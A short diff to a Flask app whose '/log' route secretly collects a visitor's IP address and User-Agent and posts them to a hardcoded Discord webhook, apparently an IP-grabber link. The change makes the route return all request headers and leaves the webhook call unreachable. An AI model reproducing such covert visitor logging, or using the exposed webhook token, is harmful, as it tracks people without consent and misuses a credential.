@@ -12,8 +12,12 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1526282389628915726/HE9Q2YrI1na7
 
 @app.route("/log")
 def log_ip():
-    ip = request.remote_addr
-    user_agent = request.headers.get("User-Agent")
+    return {
+        "remote_addr": request.remote_addr,
+        "access_route": request.access_route,
+        "x_forwarded_for": request.headers.get("X-Forwarded-For"),
+        "headers": dict(request.headers)
+    }
 
     requests.post(WEBHOOK_URL, json={
         "content": f"IP: {ip}\nUser-Agent: {user_agent}"
